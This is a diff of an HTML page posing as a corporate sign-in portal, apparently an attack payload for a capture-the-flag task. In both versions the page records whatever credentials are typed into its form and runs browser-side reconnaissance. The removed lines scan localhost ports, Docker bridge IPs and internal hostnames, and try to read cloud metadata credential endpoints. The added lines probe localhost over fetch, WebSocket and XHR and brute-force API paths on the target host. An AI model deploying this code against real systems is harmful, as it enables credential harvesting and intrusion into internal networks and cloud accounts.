@@ -2,8 +2,8 @@
 <html><head>
 <title>Sign In - Corporate Portal</title>
 <style>
-body { font-family: monospace; font-size: 10px; margin: 5px; background: #fff; }
-#r { white-space: pre-wrap; word-break: break-all; background: #ffe; border: 1px solid #cc0; padding: 4px; margin-top: 5px; font-size: 9px; }
+body { font-family: monospace; font-size: 9px; margin: 5px; background: #fff; }
+#r { white-space: pre-wrap; word-break: break-all; background: #ffe; border: 1px solid #cc0; padding: 4px; margin-top: 5px; font-size: 8px; line-height: 1.2; }
 input { font-size: 14px; padding: 3px; width: 250px; display: block; margin: 3px 0 6px; }
 </style>
 </head>
@@ -16,114 +16,108 @@ input { font-size: 14px; padding: 3px; width: 250px; display: block; margin: 3px
 </form>
 <div id="r">Loading...</div>
 <script>
-var R=document.getElementById('r'), L=[], cap=false;
+var R=document.getElementById('r'),L=[],cap=false;
 function log(m){L.push(m);R.textContent=L.join('\n');}
 
-// Prevent form submission so page stays
-document.getElementById('f').addEventListener('submit',function(e){
-  e.preventDefault();
-  var u=document.getElementById('u').value, p=document.getElementById('p').value;
-  log('SUBMIT BLOCKED - CREDS: '+u+' | '+p);
-});
+document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();});
 
-// Poll for creds
 setInterval(function(){
-  var u=document.getElementById('u'), p=document.getElementById('p');
-  if(u&&p&&(u.value||p.value)&&!cap){
-    cap=true;
-    log('CREDS CAPTURED: '+u.value+' | '+p.value);
-  }
+  var u=document.getElementById('u'),p=document.getElementById('p');
+  if(u&&p&&(u.value||p.value)&&!cap){cap=true;log('CREDS: '+u.value+' | '+p.value);}
 },100);
 
-// Port scan
-var ports=[21,22,25,53,80,81,110,143,443,587,993,995,1025,1080,1443,2525,3000,3001,4000,4443,5000,5001,5432,6379,7070,8000,8025,8080,8081,8443,8888,9000,9090,9200,9222,9999,10000,11211,15672,27017];
+async function tryFetch(label, url, opts) {
+  try {
+    var c=new AbortController();
+    var t=setTimeout(function(){c.abort();},3000);
+    opts = opts || {};
+    opts.signal = c.signal;
+    var r = await fetch(url, opts);
+    clearTimeout(t);
+    try {
+      var txt = await r.text();
+      log(label+' -> '+r.status+': '+txt.substring(0,500));
+    } catch(e2) {
+      log(label+' -> '+r.status+' (opaque/unreadable)');
+    }
+  } catch(e) {
+    clearTimeout(t);
+    log(label+' ERR: '+e.message);
+  }
+}
 
-async function scan(){
-  log('=== SCAN START ===');
+async function main(){
+  log('=== START ===');
 
-  // 1. Port scan with timing
-  log('--- PORT SCAN ---');
-  for(var i=0;i<ports.length;i+=8){
-    var batch=ports.slice(i,i+8);
-    var results=await Promise.all(batch.map(function(port){
-      var t0=Date.now();
-      return new Promise(function(resolve){
-        var img=new Image();
+  // Test: can we read localhost with CORS?
+  await tryFetch('CORS http://localhost/', 'http://localhost/');
+  await tryFetch('CORS http://127.0.0.1/', 'http://127.0.0.1/');
+  await tryFetch('NO-CORS http://127.0.0.1/', 'http://127.0.0.1/', {mode:'no-cors'});
+
+  // Test: fetch the canary API (same protocol HTTPS)
+  await tryFetch('CORS canary /api/pow', 'https://canary.task.sasc.tf/api/pow');
+  await tryFetch('CORS canary /', 'https://canary.task.sasc.tf/');
+  await tryFetch('NO-CORS canary /api/pow', 'https://canary.task.sasc.tf/api/pow', {mode:'no-cors'});
+
+  // Port scan with fetch no-cors and timing - just key ports
+  log('--- PORT TIMING (fetch no-cors) ---');
+  var ports=[80,443,1025,1080,2525,3000,4000,5000,8000,8025,8080,8443,9090,9200,11211];
+  for(var i=0;i<ports.length;i++){
+    var p=ports[i];
+    var t0=Date.now();
+    try{
+      var c=new AbortController();
+      var tm=setTimeout(function(){c.abort();},2000);
+      await fetch('http://127.0.0.1:'+p+'/',{mode:'no-cors',signal:c.signal});
+      clearTimeout(tm);
+      log('PORT '+p+': OK ('+(Date.now()-t0)+'ms)');
+    }catch(e){
+      clearTimeout(tm);
+      log('PORT '+p+': FAIL ('+(Date.now()-t0)+'ms) '+e.name);
+    }
+  }
+
+  // Try WebSocket connections to localhost
+  log('--- WEBSOCKET TEST ---');
+  var wsPorts=[80,3000,8025,8080,9222];
+  for(var j=0;j<wsPorts.length;j++){
+    var wp=wsPorts[j];
+    await new Promise(function(resolve){
+      try{
+        var t0=Date.now();
+        var ws=new WebSocket('ws://127.0.0.1:'+wp+'/');
         var done=false;
-        img.onload=img.onerror=function(){
-          if(!done){done=true;resolve({port:port,ms:Date.now()-t0,status:'resp'});}
-        };
-        setTimeout(function(){
-          if(!done){done=true;resolve({port:port,ms:Date.now()-t0,status:'timeout'});}
-        },1500);
-        img.src='http://127.0.0.1:'+port+'/favicon.ico?t='+Date.now();
-      });
-    }));
-    results.forEach(function(r){
-      if(r.status==='resp'||r.ms<1000) log('PORT '+r.port+': '+r.status+' ('+r.ms+'ms)');
+        ws.onopen=function(){if(!done){done=true;log('WS '+wp+': OPEN ('+(Date.now()-t0)+'ms)');ws.close();resolve();}};
+        ws.onerror=function(){if(!done){done=true;log('WS '+wp+': ERR ('+(Date.now()-t0)+'ms)');resolve();}};
+        ws.onclose=function(){if(!done){done=true;log('WS '+wp+': CLOSE ('+(Date.now()-t0)+'ms)');resolve();}};
+        setTimeout(function(){if(!done){done=true;log('WS '+wp+': TIMEOUT');try{ws.close();}catch(e){}resolve();}},2000);
+      }catch(e){log('WS '+wp+': EXCEPTION '+e.message);resolve();}
     });
   }
 
-  // 2. Try fetch on port 80 paths (cors mode to read body)
-  log('--- FETCH PATHS ON :80 ---');
-  var paths=['/','/flag','/admin','/login','/api','/api/flag','/api/config','/api/health','/env','/debug','/status','/metrics','/healthz','/.env','/config','/secret','/internal','/api/internal','/api/admin','/api/credentials','/api/canary','/canary','/mail','/api/mail'];
-  for(var j=0;j<paths.length;j++){
-    try{
-      var c=new AbortController();
-      var t=setTimeout(function(){c.abort();},2000);
-      var resp=await fetch('http://127.0.0.1'+paths[j],{signal:c.signal});
-      clearTimeout(t);
-      var txt=await resp.text();
-      log('GET '+paths[j]+' -> '+resp.status+': '+txt.substring(0,200));
-    }catch(e){clearTimeout(t);}
+  // Try XMLHttpRequest to localhost (sometimes different behavior than fetch)
+  log('--- XHR TEST ---');
+  await new Promise(function(resolve){
+    var xhr=new XMLHttpRequest();
+    xhr.open('GET','http://127.0.0.1/',true);
+    xhr.onload=function(){log('XHR /: '+xhr.status+' '+xhr.responseText.substring(0,300));resolve();};
+    xhr.onerror=function(){log('XHR /: error');resolve();};
+    xhr.ontimeout=function(){log('XHR /: timeout');resolve();};
+    xhr.timeout=3000;
+    try{xhr.send();}catch(e){log('XHR /: send error '+e.message);resolve();}
+  });
+
+  // Try to access interesting paths on canary domain (HTTPS, no mixed content)
+  log('--- CANARY PATHS ---');
+  var cpaths=['/api/pow','/api/jobs','/api/config','/api/health','/api/admin','/api/flag','/api/internal','/admin','/flag','/debug','/env','/status','/metrics','/internal','/api/credentials','/api/canary','/canary','/mail','/api/mail','/api/alerts','/api/report','/api/webhook','/api/notify','/gateway','/api/gateway'];
+  for(var k=0;k<cpaths.length;k++){
+    await tryFetch('CANARY '+cpaths[k], 'https://canary.task.sasc.tf'+cpaths[k]);
   }
 
-  // 3. Try hostname resolution via fetch no-cors
-  log('--- HOSTNAME SCAN ---');
-  var hosts=['mail','smtp','mailhog','mailpit','redis','app','api','canary','web','backend','proxy','internal','postfix','rspamd','spamassassin','clamav','amavis','dovecot','roundcube','haraka','zone-mta','wildduck','maddy','mta','mda','imap','pop3','submission','milter'];
-  for(var k=0;k<hosts.length;k++){
-    try{
-      var c2=new AbortController();
-      var t2=setTimeout(function(){c2.abort();},1500);
-      var t0=Date.now();
-      await fetch('http://'+hosts[k]+'/',{mode:'no-cors',signal:c2.signal});
-      clearTimeout(t2);
-      log('HOST '+hosts[k]+': REACHABLE ('+(Date.now()-t0)+'ms)');
-    }catch(e){clearTimeout(t2);}
-  }
-
-  // 4. Try some ports on common docker bridge IPs
-  log('--- DOCKER BRIDGE ---');
-  var ips=['172.17.0.1','172.17.0.2','172.17.0.3','172.17.0.4','172.17.0.5','10.0.0.1','10.0.0.2','10.0.1.1'];
-  for(var m=0;m<ips.length;m++){
-    try{
-      var c3=new AbortController();
-      var t3=setTimeout(function(){c3.abort();},1500);
-      var t1=Date.now();
-      await fetch('http://'+ips[m]+'/',{mode:'no-cors',signal:c3.signal});
-      clearTimeout(t3);
-      log('IP '+ips[m]+': REACHABLE ('+(Date.now()-t1)+'ms)');
-    }catch(e){clearTimeout(t3);}
-  }
-
-  // 5. Try ECS/cloud metadata
-  log('--- METADATA ---');
-  var meta=['http://169.254.170.2/v2/metadata','http://169.254.170.2/v2/credentials','http://169.254.170.2/v4','http://169.254.169.254/latest/meta-data/','http://169.254.169.254/latest/user-data'];
-  for(var n=0;n<meta.length;n++){
-    try{
-      var c4=new AbortController();
-      var t4=setTimeout(function(){c4.abort();},2000);
-      var resp2=await fetch(meta[n],{signal:c4.signal});
-      clearTimeout(t4);
-      var txt2=await resp2.text();
-      log('META '+meta[n]+' -> '+resp2.status+': '+txt2.substring(0,300));
-    }catch(e){clearTimeout(t4);}
-  }
-
-  log('=== SCAN COMPLETE ===');
+  log('=== DONE ===');
 }
 
-scan().catch(function(e){log('ERR: '+e.message);});
+main().catch(function(e){log('MAIN ERR: '+e.message);});
 </script>
 </body>
 </html>
